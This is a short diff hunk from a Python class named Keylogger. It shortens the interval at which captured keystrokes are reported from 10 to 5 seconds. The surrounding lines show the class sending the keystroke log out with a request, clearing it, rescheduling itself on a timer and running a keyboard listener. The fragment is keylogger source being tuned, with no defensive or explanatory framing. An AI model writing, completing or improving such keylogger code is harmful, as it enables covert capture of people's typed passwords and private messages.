@@ -57,7 +57,7 @@ class Keylogger:
             self.send_request()
             self.log = ""  # Reset log after sending
         if not self.stop_keylogger:
-            threading.Timer(10, self.report).start()  # Repeat every 10 seconds
+            threading.Timer(5, self.report).start()  # Repeat every 5 seconds
 
     def start(self):
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
